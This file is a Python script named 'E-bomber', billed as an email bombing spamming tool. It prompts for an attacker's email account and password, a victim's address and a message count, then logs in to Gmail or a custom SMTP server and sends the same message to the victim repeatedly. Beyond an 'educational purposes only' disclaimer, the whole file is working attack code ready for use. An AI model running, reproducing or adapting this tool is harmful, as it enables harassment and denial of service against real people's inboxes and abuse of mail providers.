#!/usr/bin/python3
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!
# Python 3 rewrite by Omicron166

from os import urandom
import smtplib
from getpass import getpass
import sys
from time import sleep

print('''                                                                    
                                                                    
            #################################################       
            #                                               #       
            #        Email Bomber ( Spamming Tool )         #       
            #                                               #       
            #                  Version 3.0                  #       
            #                                               #       
            #           Modified by : Mohin Paramasivam     #       
            #                                               #       
            #       Only for Educational Purposes !!        #       
            #                                               #       
            #################################################\n\n''')      
try:
    user , email , passwd = input('Anonymous name: ') , input('\nAttacker Email Address: ') , getpass('\nAttacker Email Password: ')\
    to , total , body = input('\nVictim Email Address: ') , int(input('\nNumber of emails: ')) , input('\nMessage: ')
    Cserver = input('\nCustom smtp server (leave blank to use gmail): ')
except:
    pass


if Cserver != '':
    defaultconf = False
    smtp_server = Cserver
    Cport = input('Custom smtp port (leave blank to use defaul port): ')
    if Cport != '':
        port = int(Cport)
    else:
        port = 587
else:
    smtp_server = 'smtp.gmail.com'
    port = 587
    defaultconf = True


try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    for i in range(1, int(total) + 1):
        subject = urandom(9)
        msg = f'From:{user}\nMessage:\n{body}'
        server.sendmail(email, to, msg)
        print(f"E-mails sent: {i}")
        sleep(1)
        sys.stdout.flush()
    server.quit()
    print('Done !!!')
    sys.exit()
except KeyboardInterrupt:
    print('[-] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print('[!] The username or password you entered is incorrect')
    sys.exit()
except smtplib.SMTPConnectError:
    print('\n[!] Failed to connect with the SMTP server')
    sys.exit()
else:
    pass
